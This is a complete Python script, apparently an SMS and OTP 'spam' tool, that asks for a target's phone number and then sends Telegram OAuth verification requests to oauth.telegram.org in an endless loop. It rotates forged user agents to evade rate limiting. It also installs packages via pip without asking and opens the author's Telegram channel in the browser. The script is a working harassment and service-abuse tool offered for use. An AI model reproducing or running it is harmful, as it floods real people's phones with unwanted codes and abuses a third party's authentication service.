try:
 import requests,os
 import time
 from cfonts import render, say
 from colorama import init, Fore, Style
 from datetime import datetime
 from itertools import cycle
 import json
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install colorama')
 os.system('pip install cfonts')
 os.system('pip install itertools')
 os.system('clear')
b='\033[31m' #red
g='\033[32m' #green
y='\033[33m' #yellow
p='\033[34m' #blue
m='\033[35m' #magenta
c='\033[36m' #cyan
w='\033[37m' #white
def JOK(text, delay, add_new_line=True):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(delay)
    if add_new_line:
        print("\n", end="", flush=True)
output = render('🇮🇳 ARJUN 🇮🇳', colors=['red', 'yellow'], align='center')
print (output)
JOK(m+f"\033[1;32m\n                  『ᴍᴀᴅᴇ ʙʏ : ᴛᴏxɪᴄ ᴀʀᴊᴜɴ ™ \n                         ᴛᴇʟᴇɢʀᴀᴍ: @privatearjun \n                            ᴄʜᴀɴɴᴇʟ : @ᴛᴏxɪᴄᴀʀᴊᴜɴ  』", 0.07, True)
import telebot
import requests
import os
import webbrowser

webbrowser.open('https://t.me/privatearjun')
import os
try:
  from rich.console import Console
  from rich.table import Table
  import requests
  from user_agent import generate_user_agent
  import random 
except:
  os.system("pip install rich requests user_agent")

from rich.console import Console
from rich.table import Table
import requests
from user_agent import generate_user_agent
import random 

FPI = {
"Iraq-🇮🇶": "+964",

"Iceland-🇮🇸": "+354",

"Iran, Islamic Republic of-🇮🇷": "+98",

"Italy-🇮🇹": "+39",

"Ireland-🇮🇪": "+353",

"Indonesia-🇮🇩": "+62",

"Turkmenistan-🇹🇲": "+993",

"Isle of Man-🇮🇲": "+44",

"Israel-🇮🇱": "+972",

"British Indian Ocean Territory-🇮🇴": "+246",

"India-🇮🇳": "+91",

"Bhutan-🇧🇹": "+975",

"Botswana-🇧🇼": "+267",

"Yemen-🇾🇪": "+967",

"Bonaire, Sint Eustatius and Saba-🇧🇶": "+599",

"Brazil-🇧🇷": "+55",

"Bahamas-🇧🇸": "+1",

"Kuwait-🇰🇼": "+965",

"Belarus-🇧🇾": "+375",

"Belize-🇧🇿": "+501",

"Bangladesh-🇧🇩": "+880",

"Belgium-🇧🇪": "+32",

"Burkina Faso-🇧🇫": "+226",

"Bulgaria-🇧🇬": "+359",

"Mayotte-🇾🇹": "+262",

"Barbados-🇧🇧": "+1",

"Bosnia and Herzegovina-🇧🇦": "+387",

"Saint Barthélemy-🇧🇱": "+590",

"Bermuda-🇧🇲": "+1",

"Brunei Darussalam-🇧🇳": "+673",

"Bolivia, Plurinational State of-🇧🇴": "+591",

"Bahrain-🇧🇭": "+973",

"Burundi-🇧🇮": "+257",

"Benin-🇧🇯": "+229",

"Qatar-🇶🇦": "+974",

"Réunion-🇷🇪": "+262",

"Romania-🇷🇴": "+40",

"Japan-🇯🇵": "+81",

"Jamaica-🇯🇲": "+1",

"Russian Federation-🇷🇺": "+7",

"Rwanda-🇷🇼": "+250",

"Jordan-🇯🇴": "+962",

"Serbia-🇷🇸": "+381",

"Jersey-🇯🇪": "+44",

"Curaçao-🇨🇼": "+599",

"Cabo Verde-🇨🇻": "+238",

"Cuba-🇨🇺": "+53",

"Zambia-🇿🇲": "+260",

"Costa Rica-🇨🇷": "+506",

"South Africa-🇿🇦": "+27",

"Cyprus-🇨🇾": "+357",

"Christmas Island-🇨🇽": "+61",

"Congo-🇨🇬": "+242",

"Central African Republic-🇨🇫": "+236",

"Czechia-🇨🇿": "+420",

"Congo, The Democratic Republic of the-🇨🇩": "+243",

"Cocos (Keeling) Islands-🇨🇨": "+61",

"Canada-🇨🇦": "+1",

"Colombia-🇨🇴": "+57",

"China-🇨🇳": "+86",

"Cameroon-🇨🇲": "+237",

"Chile-🇨🇱": "+56",

"Zimbabwe-🇿🇼": "+263",

"Cook Islands-🇨🇰": "+682",

"Côte d'Ivoire-🇨🇮": "+225",

"Switzerland-🇨🇭": "+41",

"Wallis and Futuna-🇼🇫": "+681",

"Samoa-🇼🇸": "+685",

"Tajikistan-🇹🇯": "+992",

"Haiti-🇭🇹": "+509",

"Hungary-🇭🇺": "+36",

"Croatia-🇭🇷": "+385",

"Honduras-🇭🇳": "+504",

"Hong Kong-🇭🇰": "+852",

"Anguilla-🇦🇮": "+1",

"Armenia-🇦🇲": "+374",

"Albania-🇦🇱": "+355",

"Angola-🇦🇴": "+244",

"Paraguay-🇵🇾": "+595",

"Palau-🇵🇼": "+680",

"???-🇵🇼": "+247",

"Portugal-🇵🇹": "+351",

"Puerto Rico-🇵🇷": "+1",

"Andorra-🇦🇩": "+376",

"Antigua and Barbuda-🇦🇬": "+1",

"Afghanistan-🇦🇫": "+93",

"???-🇦🇫": "+383",

"Åland Islands-🇦🇽": "+358",

"Poland-🇵🇱": "+48",

"Saint Pierre and Miquelon-🇵🇲": "+508",

"Palestine, State of-🇵🇸": "+970",

"Pakistan-🇵🇰": "+92",

"Philippines-🇵🇭": "+63",

"Azerbaijan-🇦🇿": "+994",

"French Polynesia-🇵🇫": "+689",

"Papua New Guinea-🇵🇬": "+675",

"American Samoa-🇦🇸": "+1",

"Argentina-🇦🇷": "+54",

"Australia-🇦🇺": "+61",

"Peru-🇵🇪": "+51",

"Austria-🇦🇹": "+43",

"Aruba-🇦🇼": "+297",

"Panama-🇵🇦": "+507",

"Uganda-🇺🇬": "+256",

"Ukraine-🇺🇦": "+380",

"Uruguay-🇺🇾": "+598",

"Uzbekistan-🇺🇿": "+998",

"United States-🇺🇸": "+1",

"Namibia-🇳🇦": "+264",

"New Caledonia-🇳🇨": "+687",

"Niger-🇳🇪": "+227",

"Norfolk Island-🇳🇫": "+672",

"Nigeria-🇳🇬": "+234",

"Nicaragua-🇳🇮": "+505",

"France-🇫🇷": "+33",

"Saudi Arabia-🇸🇦": "+966",

"Netherlands-🇳🇱": "+31",

"Norway-🇳🇴": "+47",

"Nepal-🇳🇵": "+977",

"Finland-🇫🇮": "+358",

"Nauru-🇳🇷": "+674",

"Falkland Islands (Malvinas)-🇫🇰": "+500",

"Fiji-🇫🇯": "+679",

"Niue-🇳🇺": "+683",

"Micronesia, Federated States of-🇫🇲": "+691",

"Faroe Islands-🇫🇴": "+298",

"New Zealand-🇳🇿": "+64",

"Virgin Islands, U.S.-🇻🇮": "+1",

"Viet Nam-🇻🇳": "+84",

"Holy See (Vatican City State)-🇻🇦": "+39",

"Saint Vincent and the Grenadines-🇻🇨": "+1",

"Venezuela, Bolivarian Republic of-🇻🇪": "+58",

"Virgin Islands, British-🇻🇬": "+1",

"Vanuatu-🇻🇺": "+678",

"Guyana-🇬🇾": "+592",

"Greece-🇬🇷": "+30",

"Equatorial Guinea-🇬🇶": "+240",

"Guadeloupe-🇬🇵": "+590",

"Guinea-Bissau-🇬🇼": "+245",

"Guam-🇬🇺": "+1",

"Guatemala-🇬🇹": "+502",

"Oman-🇴🇲": "+968",

"Gibraltar-🇬🇮": "+350",

"Ghana-🇬🇭": "+233",

"Guinea-🇬🇳": "+224",

"Gambia-🇬🇲": "+220",

"Greenland-🇬🇱": "+299",

"United Kingdom-🇬🇧": "+44",

"Gabon-🇬🇦": "+241",

"Guernsey-🇬🇬": "+44",

"French Guiana-🇬🇫": "+594",

"Georgia-🇬🇪": "+995",

"Grenada-🇬🇩": "+1",

"Singapore-🇸🇬": "+65",

"Sweden-🇸🇪": "+46",

"Sudan-🇸🇩": "+249",

"Seychelles-🇸🇨": "+248",

"Kazakhstan-🇰🇿": "+7",

"Cayman Islands-🇰🇾": "+1",

"Solomon Islands-🇸🇧": "+677",

"Somalia-🇸🇴": "+252",

"Senegal-🇸🇳": "+221",

"San Marino-🇸🇲": "+378",

"Sierra Leone-🇸🇱": "+232",

"Slovakia-🇸🇰": "+421",

"Svalbard and Jan Mayen-🇸🇯": "+47",

"Korea, Republic of-🇰🇷": "+82",

"Saint Helena, Ascension and Tristan da Cunha-🇸🇭": "+290",

"Slovenia-🇸🇮": "+386",

"Saint Kitts and Nevis-🇰🇳": "+1",

"Comoros-🇰🇲": "+269",

"Sao Tome and Principe-🇸🇹": "+239",

"South Sudan-🇸🇸": "+211",

"El Salvador-🇸🇻": "+503",

"Suriname-🇸🇷": "+597",

"Kiribati-🇰🇮": "+686",

"Korea, Democratic People's Republic of-🇰🇵": "+850",

"Cambodia-🇰🇭": "+855",

"Kenya-🇰🇪": "+254",

"Kyrgyzstan-🇰🇬": "+996",

"Eswatini-🇸🇿": "+268",

"Syrian Arab Republic-🇸🇾": "+963",

"Sint Maarten (Dutch part)-🇸🇽": "+1",

"Algeria-🇩🇿": "+213",

"Germany-🇩🇪": "+49",

"Djibouti-🇩🇯": "+253",

"Denmark-🇩🇰": "+45",

"Dominican Republic-🇩🇴": "+1",

"Dominica-🇩🇲": "+1",

"Turks and Caicos Islands-🇹🇨": "+1",

"Libya-🇱🇾": "+218",

"Mauritania-🇲🇷": "+222",

"Togo-🇹🇬": "+228",

"Chad-🇹🇩": "+235",

"???-🇹🇩": "+290",

"Liberia-🇱🇷": "+231",

"Lesotho-🇱🇸": "+266",

"Thailand-🇹🇭": "+66",

"Tokelau-🇹🇰": "+690",

"Tunisia-🇹🇳": "+216",

"Latvia-🇱🇻": "+371",

"Lithuania-🇱🇹": "+370",

"Luxembourg-🇱🇺": "+352",

"Türkiye-🇹🇷": "+90",

"Sri Lanka-🇱🇰": "+94",

"Timor-Leste-🇹🇱": "+670",

"Liechtenstein-🇱🇮": "+423",

"Tonga-🇹🇴": "+676",

"Tuvalu-🇹🇻": "+688",

"Trinidad and Tobago-🇹🇹": "+1",

"Taiwan, Province of China-🇹🇼": "+886",

"Tanzania, United Republic of-🇹🇿": "+255",

"Saint Lucia-🇱🇨": "+1",

"Lebanon-🇱🇧": "+961",

"Lao People's Democratic Republic-🇱🇦": "+856",

"United Arab Emirates-🇦🇪": "+971",

"Montenegro-🇲🇪": "+382",

"Moldova, Republic of-🇲🇩": "+373",

"Madagascar-🇲🇬": "+261",

"Saint Martin (French part)-🇲🇫": "+590",

"Morocco-🇲🇦": "+212",

"Monaco-🇲🇨": "+377",

"Myanmar-🇲🇲": "+95",

"Mali-🇲🇱": "+223",

"Ethiopia-🇪🇹": "+251",

"Macao-🇲🇴": "+853",

"Mongolia-🇲🇳": "+976",

"Marshall Islands-🇲🇭": "+692",

"Spain-🇪🇸": "+34",

"Eritrea-🇪🇷": "+291",

"Mauritius-🇲🇺": "+230",

"Malta-🇲🇹": "+356",

"Malawi-🇲🇼": "+265",

"North Macedonia-🇲🇰": "+389",

"Martinique-🇲🇶": "+596",

"Northern Mariana Islands-🇲🇵": "+1",

"Montserrat-🇲🇸": "+1",

"Western Sahara-🇪🇭": "+212",

"Estonia-🇪🇪": "+372",

"Maldives-🇲🇻": "+960",

"Egypt-🇪🇬": "+20",

"Malaysia-🇲🇾": "+60",

"Mexico-🇲🇽": "+52",

"Ecuador-🇪🇨": "+593",

"Mozambique-🇲🇿": "+258",
}


console = Console()

table = Table(title="Country Codes")


table.add_column("Number", justify="center", style="cyan")
table.add_column("Country", justify="center", style="magenta")
table.add_column("Code", justify="center", style="green")

for idx, (country, code) in enumerate(FPI.items(), 1):
    table.add_row(str(idx), country, code)


console.print(table)


Ssl = int(input("Choose a country by number: "))


com = list(FPI.keys())[Ssl - 1]

num = input("ENTER YOUR TRAGET PHONE NUMBER  :")

fuck = f"{FPI[com]}{num}"
console.print(f"[bold green] START SPAM FOR {fuck} [/bold green]")

number = fuck.split('+')[1]

def dalvik():
    vr = ["1.6.0", "2.1.0", "2.1.2"]
    an = ["7.0", "8.1", "9", "10", "11", "12", "13"]
    dev = [
        "SM-G960F", "SM-G975F", "SM-N960F", "Pixel 4", "Pixel 5", "Nexus 6", 
        "OnePlus 7T", "HUAWEI P30", "Xiaomi Mi 9", "Redmi Note 8", "OPPO Reno2"
    ]
    sos = [
        "QP1A.190711.020", "RP1A.200720.012", "PPR1.180610.011", 
        "NRD90M", "QKQ1.190910.002", "LMY47V"
    ]
    nano = random.choice(vr)  
    com = random.choice(an)
    mod = random.choice(dev)
    lp = random.choice(sos)
    user_agent = f"Dalvik/{nano} (Linux; U; Android {com}; {mod} Build/{lp})"
    
    return user_agent


def Users(browser_type=random.choice(['chrome', 'kiwi', 'brave', 'edge'])):
    
    lop = ["9", "10", "11", "12", "13", "14"]
    
    sms = [
        "Pixel 4", "Pixel 5", "Pixel 6", "Pixel 7", "Samsung Galaxy S21",
        "Samsung Galaxy S22", "Samsung Galaxy Note 20", "OnePlus 9", "OnePlus 10 Pro",
        "Xiaomi Mi 11", "Huawei P40", "Sony Xperia 1 III"
    ]
    
    ml = random.randint(89, 117)  
    oop = random.randint(537, 540)
    
    mmk = random.choice(lop)
    awq = random.choice(sms)
    
    
    if browser_type == "chrome":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36"
    
    elif browser_type == "kiwi":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Kiwi/{ml}.0.0.0 Mobile Safari/{oop}.36"
    
    elif browser_type == "brave":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 Brave/{ml}.0.0.0"
    
    elif browser_type == "edge":
        user_agent = f"Mozilla/5.0 (Linux; Android {mmk}; {awq}) AppleWebKit/{oop}.36 (KHTML, like Gecko) Chrome/{ml}.0.0.0 Mobile Safari/{oop}.36 EdgA/{ml}.0.0.0"
    
    return user_agent


def IOS():
    los = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0"]
    dec = [
        "iPhone12,1",  
        "iPhone12,3",  
        "iPhone13,4",  
        "iPhone14,2",  
        "iPhone14,5",  
        "iPhone15,2",  
        "iPad8,1",     
        "iPad8,9",     
        "iPad11,6",
    ]       
    web = random.randint(600, 605)
    sf = random.randint(14, 17)   
    nok = random.choice(los)
    mod = random.choice(dec)
    
    user_agent = f"Mozilla/5.0 (iPhone; CPU iPhone OS {nok.replace('.', '_')} like Mac OS X) AppleWebKit/{web}.1 (KHTML, like Gecko) Version/{sf}.0 Mobile/15E148 Safari/{web}.1"
    
    return user_agent



def Spam(number):
    while True:
      agent = random.choice([IOS(), Users(), dalvik(), generate_user_agent()])
      payload = f"phone={number}"
      headers = {
  'User-Agent': agent,
  'Accept-Encoding': "gzip, deflate, br, zstd",
  'Content-Type': "application/x-www-form-urlencoded",
  'sec-ch-ua': "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Android WebView\";v=\"128\"",
  'sec-ch-ua-platform': "\"Android\"",
  'x-requested-with': "XMLHttpRequest",
  'sec-ch-ua-mobile': "?1",
  'origin': "https://oauth.telegram.org",
  'sec-fetch-site': "same-origin",
  'sec-fetch-mode': "cors",
  'sec-fetch-dest': "empty",
  'referer': "https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write",
  'accept-language': "ar,ar-YE;q=0.9,en-US;q=0.8,en;q=0.7",
  'priority': "u=1, i",
}
      try:
        response = requests.post("https://oauth.telegram.org/auth/request", params={'bot_id': "5444323279",'origin': "https://fragment.com",'request_access': "write",}, data=payload, headers=headers)

        console.print(f"[bold green]The SPAMING is {response.text} [/bold green]")
      except:
          print("Erorr")
#BY Toxic Hacker 
Spam(fuck)